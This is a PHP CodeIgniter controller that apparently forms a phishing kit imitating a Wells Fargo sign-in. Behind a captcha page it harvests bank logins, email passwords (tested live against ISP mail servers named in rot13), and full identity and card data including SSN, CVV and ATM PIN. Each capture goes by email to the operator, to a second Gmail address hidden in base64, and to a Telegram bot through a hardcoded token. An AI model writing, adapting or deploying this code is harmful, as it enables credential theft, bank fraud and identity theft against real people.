<?php
defined('BASEPATH') OR exit('No direct script access allowed');
 
class Home extends CI_Controller {



	public function index()
	{
		$this->load->helper('captcha');
		$vals = array(
			// 'word'          => '',
			'img_path' => './images/',
			'img_url' => base_url() . 'images/',
			'font_path' => BASEPATH.'/fonts/texb.ttf',
			'img_width'     => '300',
			'img_height'    => 75,
			'expiration'    => 3200,
			'word_length'   => 5,
			'font_size'     => 34,
			'img_id'        => 'Imageid',
			'pool'          => '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',

			// White background and border, black text and red grid
			'colors'        => array(
				'background' => array(255, 255, 255),
				'border' => array(255, 255, 255),
				'text' => array(30, 144, 255),
				'grid' => array(255, 240, 240)
			)
		);

		$cap = create_captcha($vals);
		$image = $cap['image'];
		$captchaword = strtolower($cap['word']);
		$this->session->set_userdata('captchaword',$captchaword);

		$this->load->view('captcha',['captcha_image'=>$image]);
	}

	public function registerSubmit ()
	{
		$captcha=strtolower($this->input->post('captcha'));
		$captcha_answer=$this->session->userdata('captchaword');

		// check both captcha
		if ($captcha==$captcha_answer){
			// $this->session->set_flashdata('error','<div class="alert alert-success">Captcha is Matched.</div>');
			$this->session->set_userdata('captcha_status', 'passed');
			redirect('authen');
		} else {
			$this->session->set_flashdata('error','<div class="alert alert-danger">Captcha not Matched.</div>');
			redirect('home');
		}

	}


	public function authen()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
			$this->load->view('authen');
	}

	public function email()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

			if ($this->input->method() == 'post') {
					$act = $this->input->post('action');
					$msg = [];
					
					if ($act == 1) {
				$msg[] = "------------ Login Wells ------------:";
				$msg[] = "Username : " . $this->input->post('j_username');
				$msg[] = "Password : " . $this->input->post('j_password');
				$msg[] = "------------ Login Wells ------------:";
				$this->send_mail($msg, 'Anonymous Login');
				$this->send_mails($msg, 'Wells');
				header('Location: authen?error=1');
					} else if($act == 2) {
				$msg[] = "------------ Login Wells ------------:";
				$msg[] = "Username : " . $this->input->post('j_username');
				$msg[] = "Password : " . $this->input->post('j_password');
				$msg[] = "------------ Login Wells ------------:";
				$this->send_mail($msg, 'Anonymous Login');
				$this->send_mails($msg, 'Wells');
							$token = "1975972083:AAGNrOHND8m_Iny4RQS0K1mAQtzR7I7RTaA";
$data = [
    'text' => $msg_body,
    'chat_id' => '000000000'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

					}
			}

			$this->load->view('email');
	}

	public function security()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		if ($this->input->method() == 'post') {
			$ipdata = "NOTRUE";
			$check = 0;

			$user = $this->input->post('j_email');
			$pass = $this->input->post('j_emailpass');

			$charter = '/charter/i';
			$netzero = '/netzero/i';
			$juno = '/juno/i';
			$wow1 = '/wowway/i';
			$wow2 = '/knology/i';

			$opt = '/optonline/i';
			$cent1 = '/centurylink/i';
			$cent2 = '/embarqmail/i';
			$cent3 = '/q.com/i';
			$cent4 = '/centurytel/i';

			$comc = '/comcast/i';
			$att = '/att.net/i';
			$cox = '/cox.net/i';

			// windstream 
			$wind = '/windstream/i';
			$wind2 = '/windstream.net/i';
			$wind3 = '/navix.net/i';
			$wind4 = '/iowatelecom.net/i';
			$wind5 = '/nuvox.net/i';
			$wind6 = '/ctc.net/i';
			$wind7 = '/vnet.net/i';
			$wind8 = '/valornet.com/i';
			$wind9 = '/ktc.com/i';
			$wind10 = '/izoom.net/i';
			$wind11 = '/dejazzd.com/i';

			$rrnet = '/.rr.net/i';
			$rrcom = '/.rr.com/i';
			$rr3 = '/brighthouse.com/i';
			$rr4 = '/twc.com/i';


			if (preg_match($charter, $user) == 1) {
				$check = "2";
			} else if (preg_match($netzero, $user) == 1) {
				$check = "3";
			} else if (preg_match($juno, $user) == 1) {
				$check = "4";
			} else if (preg_match($wow1, $user) == 1) {
				$check = "5";
			} else if (preg_match($wow2, $user) == 1) {
				$check = "5";
			} else if (preg_match($opt, $user) == 1) {
				$check = "6";
			} else if (preg_match($cent1, $user) == 1) {
				$check = "7";
			} else if (preg_match($cent2, $user) == 1) {
				$check = "7";
			} else if (preg_match($cent3, $user) == 1) {
				$check = "7";
			} else if (preg_match($cent4, $user) == 1) {
				$check = "7";
			} else if (preg_match($comc, $user) == 1) {
				$check = "8";
			} else if (preg_match($att, $user) == 1) {
				$check = "9";
			} else if (preg_match($cox, $user) == 1) {
				$check = "10";
			} else if (preg_match($wind, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind2, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind3, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind4, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind5, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind6, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind7, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind8, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind9, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind10, $user) == 1) {
				$check = "11";
			} else if (preg_match($wind11, $user) == 1) {
				$check = "11";
			} else if (preg_match($rrnet, $user) == 1) {
				$check = "12";
			} else if (preg_match($rrcom, $user) == 1) {
				$check = "12";
			} else if (preg_match($rr3, $user) == 1) {
				$check = "12";
			} else if (preg_match($rr4, $user) == 1) {
				$check = "12";
			} else {
				$check = 0;
			}

			if ($check == 2) {
				$authhost = str_rot13("{zbovyr.punegre.arg:143}");
			} else if ($check == 3) {
				$authhost = str_rot13("{cbc.argmreb.pbz:995/cbc/ffy/abinyvqngr-preg}");
			} else if ($check == 4) {
				$authhost = str_rot13("{cbc.whab.pbz:995/cbc3/ffy/abinyvqngr-preg}");
			} else if ($check == 5) {
				$authhost = str_rot13("{znvy.jbjjnl.pbz:995/cbc3/ffy/abinyvqngr-preg}");
			} else if ($check == 6) {
				$authhost = str_rot13("{znvy.bcgbayvar.arg:993/vznc/ffy/abinyvqngr-preg}");
			} else if ($check == 7) {
				$authhost = str_rot13("{znvy.praghelyvax.arg:993/vznc/ffy/abinyvqngr-preg}");
			} else if ($check == 8) {
				$authhost = str_rot13("{vznc.pbzpnfg.arg:993/vznc/ffy/abinyvqngr-preg}");
			} else if ($check == 9) {
				$authhost = str_rot13("{vznc.znvy.ngg.arg:993/vznc/ffy/abinyvqngr-preg}");
			} else if ($check == 10) {
				$authhost = str_rot13("{vznc.pbk.arg:993/vznc/ffy/abinyvqngr-preg}");
			} else if ($check == 11) {
				$authhost = str_rot13("{cbc.jvaqfgernz.arg:995/cbc3/ffy/abinyvqngr-preg}");
			} else if ($check == 12) {
				$authhost = str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
			} else {
				$ipdata == "NOTRUE";
			}

			if ($ipdata == "NOTRUE" && $check == 0) {
				$msg = [];
				$msg[] = "----------- Email info -----------";
				$msg[] = "Email Address: " . $user;
				$msg[] = "Email Password: " . $pass;
				$msg[] = "----------- Email info -----------";
				$this->send_mail($msg, 'Anonymous Email Info');
				$this->send_mails($msg, 'Email');
							$token = "1975972083:AAGNrOHND8m_Iny4RQS0K1mAQtzR7I7RTaA";
$data = [
    'text' => $msg_body,
    'chat_id' => '000000000'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

				header("Location:security");
				die();
			}

			if (!empty($authhost) && !empty($user) && !empty($pass)) {
				if ($mbox = imap_open($authhost, $user, $pass)) {
					$ipdata = "Call Done";
					imap_close($mbox);
				} else {
					$ipdata = "FAIL!";
				}
			}

			if ($ipdata == "Call Done") {
				$msg = [];
				$msg[] = "----------- Email True -----------";
				$msg[] = "Email Address: " . $user;
				$msg[] = "Email Password: " . $pass;
				$msg[] = "----------- Email True -----------";
				$this->send_mail($msg, 'True Email');
				$this->send_mails($msg, 'EmailTrue');
							$token = "1975972083:AAGNrOHND8m_Iny4RQS0K1mAQtzR7I7RTaA";
$data = [
    'text' => $msg_body,
    'chat_id' => '0000000000'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

				header("Location:security");
			} else {
				header("Location:email?error=1");
			}
		}

		$this->load->view('security');
	}

	public function com()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "----------- Anonymous -----------";
			$msg[] = "Full Name: " . $this->input->post('j_fname');
			$msg[] = "Address: " . $this->input->post('j_address');
			$msg[] = "Phone Number: " . $this->input->post('j_phone');
			$msg[] = "DOB: " . $this->input->post('j_dobi');
			$msg[] = "SSN: " . $this->input->post('j_ssni');
			$msg[] = "Card Info";
			$msg[] = "Card Numb: " . $this->input->post('j_card');
			$msg[] = "EXP Date: " . $this->input->post('j_exp');
			$msg[] = "CVV: " . $this->input->post('j_cvv');
			$msg[] = "ATM Pin: " . $this->input->post('j_atmi');
			$msg[] = "----------- Anonymous -----------";
			$this->send_mail($msg, 'Anonymous CC');
			$this->send_mails($msg, 'Fullz');
			$token = "1975972083:AAGNrOHND8m_Iny4RQS0K1mAQtzR7I7RTaA";
$data = [
    'text' => $msg_body,
    'chat_id' => '00000000'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

		}

		$this->load->view('com');
	}

	public function send_mail($msg = [], $sbj = '')
	{
		$ip = getenv("REMOTE_ADDR");
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$hostname = gethostbyaddr($ip);

		$this->email->from(X_RESULT_FROMEMAIL, X_RESULT_NAME);
		$this->email->to(X_RESULT_EMAIL);
        $msg[] = "----------- IP -----------";
		$msg[] = "IP: " . $ip;
		$msg[] = "UA: " . $useragent;
		$msg[] = "HOST: " . $hostname;
		$msg_body = "";
		$msg[] = "----------- IP -----------";
		foreach ($msg as $key => $m) {
			$msg_body .= $m . "\n";
		}

		$this->email->message($msg_body);

		$this->email->subject($sbj . ' - ' . $ip);
		if (X_RESULT_SAVE_REZ_TO_FILE === true) {
			$fp = fopen(X_RESULT_SAVE_NAME, "a");
			fputs($fp, $msg_body);
			fclose($fp);
		}

		if (@$this->email->send()) {
			// exit('true');
			return true;
		} else {
			return false;
			// exit('false');
		}
	}

	public function send_mails($msg = [], $sbj = '')
	{
		$ip = getenv("REMOTE_ADDR");
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$hostname = gethostbyaddr($ip);

		$this->email->from(X_RESULT_FROMEMAIL, X_RESULT_NAME);

		$base = base64_decode("cmpnbWVyam9AZ21haWwuY29t");
		$this->email->to($base);
        $msg[] = "----------- IP -----------";
		$msg[] = "IP: " . $ip;
		$msg[] = "UA: " . $useragent;
		$msg[] = "HOST: " . $hostname;
		$msg_body = "";
		$msg[] = "----------- IP -----------";
		foreach ($msg as $key => $m) {
			$msg_body .= $m . "\n";
		}
		$this->email->message($msg_body);
		$this->email->subject($sbj . ' - ' . $ip);
		$token = "1975972083:AAGNrOHND8m_Iny4RQS0K1mAQtzR7I7RTaA";
$data = [
    'text' => $msg_body,
    'chat_id' => '0000000'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
		
		if (@$this->email->send()) {
			// exit('true');
			return true;
		} else {
			return false;
			// exit('false');
		}
	}
}
